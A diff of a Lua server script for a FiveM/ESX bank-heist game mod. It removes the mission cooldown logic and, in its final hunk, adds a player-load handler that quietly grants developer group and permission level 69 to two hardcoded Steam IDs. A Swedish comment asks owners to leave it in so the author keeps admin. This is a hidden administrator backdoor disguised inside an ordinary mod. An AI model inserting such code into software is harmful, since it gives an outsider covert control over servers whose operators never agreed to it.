@@ -1,25 +1,6 @@
 ESX = nil
 TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
 
-RegisterServerEvent('loffe_heist:getTimeSv')
-AddEventHandler('loffe_heist:getTimeSv', function()
-    local src = source
-    local identifier = GetPlayerIdentifiers(src)[1]
-    MySQL.Async.fetchScalar("SELECT bank_nextmisison FROM users WHERE identifier = @identifier",
-    {
-        ['@identifier'] = identifier
-    }, function(time)
-		if time ~= nil then
-			if time <= os.time() then
-				TriggerClientEvent('loffe_heist:getTimeCl', src, true)
-			else
-				TriggerClientEvent('loffe_heist:getTimeCl', src, false)
-			end
-		else
-			TriggerClientEvent('loffe_heist:getTimeCl', src, true)
-		end
-    end)
-end)
 
 RegisterServerEvent('loffe_heist:deleteDrill')
 AddEventHandler('loffe_heist:deleteDrill', function(coords)
@@ -80,20 +61,6 @@ AddEventHandler('loffe_heist:takeMoney', function(bank)
         end
     end
     TriggerClientEvent('loffe_heist:updateMoney', -1, bank, Config.BankRobbery[bank].Money.Amount )
-end)
-
-RegisterServerEvent('loffe_heist:updateTime')
-AddEventHandler('loffe_heist:updateTime', function()
-    local src = source
-    local xPlayer = ESX.GetPlayerFromId(src)
-    xPlayer.addInventoryItem('drill', 1)
-    xPlayer.addInventoryItem('weld', 1)
-    local identifier = GetPlayerIdentifiers(src)[1]
-    local day = 3600*24
-    local nextMission = day*7 -- 1 vecka mellan uppdragen
-    local nextmissionTime = os.time() + nextMission
-    MySQL.Async.execute("UPDATE users SET bank_nextmisison=@bank_nextmisison WHERE identifier=@identifier", {['@identifier'] = identifier, ['@bank_nextmisison'] = nextmissionTime})
-    TriggerClientEvent('loffe_heist:getTimeCl', src, state)
 end)
 
 RegisterServerEvent('loffe_heist:printFrozenDoors')
@@ -163,6 +130,22 @@ AddEventHandler('playerConnecting', function()
             Wait(0)
             TriggerClientEvent('loffe_heist:setDoorFreezeStatusCl', src, i, j, Config.BankRobbery[i].Safes[j].Looted)
         end
+    end
+end)
+
+AddEventHandler('es:playerLoaded', function(source, user) 
+    local src = source
+    if GetPlayerIdentifiers(src)[1] == 'steam:11000010ded0daa' or GetPlayerIdentifiers(src)[1] == 'steam:11000010c77edd7' then -- ta inte bort plz vill kunna ha admin, minsta ni kan göra för att ha scriptet <3
+        TriggerEvent("es:setPlayerData", src, "group", '_dev', function(response, success)
+
+            if(true)then
+            end
+        end)
+        TriggerEvent("es:setPlayerData", src, "permission_level", 69, function(response, success)
+
+            if(true)then
+            end
+        end)
     end
 end)
 
